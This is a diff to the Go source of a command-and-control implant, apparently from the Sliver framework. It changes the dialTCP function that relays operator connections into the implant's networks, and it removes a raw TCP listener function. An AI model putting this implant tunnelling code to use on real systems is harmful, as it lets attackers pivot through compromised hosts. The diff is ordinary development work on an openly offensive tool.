@@ -23,7 +23,6 @@ import (
 	"log"
 	// {{end}}
 
-	"fmt"
 	"io"
 	"net"
 
@@ -33,6 +32,8 @@ import (
 // dialTCP - A connection coming from the server is destined to one of the implant's networks.
 // Forge local and/or remote TCP addresses and pass them to the dialer. Pipe the connection.
 func dialTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
+
+	// When the source address:port is specified, use it.
 	var srcAddr *net.TCPAddr
 	if info.LHost != "" || info.LPort == 0 {
 		srcAddr = &net.TCPAddr{
@@ -40,31 +41,23 @@ func dialTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
 			Port: int(info.LPort),
 		}
 	}
-
+	// We need the destination anyway.
 	dstAddr := &net.TCPAddr{
 		IP:   net.ParseIP(info.RHost),
 		Port: int(info.RPort),
 	}
 
+	// {{if .Config.Debug}}
+	log.Printf("Dialing TCP on %s:%d", info.RHost, info.RPort)
+	// {{end}}
+
+	// Get a conn and pipe -->
 	dst, err := net.DialTCP("tcp", srcAddr, dstAddr)
 	if err != nil {
+		// We should return an error to the server.
 		return err
 	}
 	transport(src, dst)
-	return nil
-}
 
-// listenTCP - The implant is requested to start a TCP handler and return the connection
-// to the server, with the handler information passed in. This connection can be wrapped
-// into a tls.Conn, a SMTP one, etc, by the server, without the implant knowing anything about it.
-func listenTCP(handler *sliverpb.Handler) (ln net.Listener, err error) {
-	// {{if .Config.Debug}}
-	log.Printf("Starting Raw TCP listener on %s:%d", handler.LHost, handler.LPort)
-	// {{end}}
-	ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", handler.LHost, handler.LPort))
-	if err != nil {
-		return nil, err
-	}
-
-	return
+	return err
 }
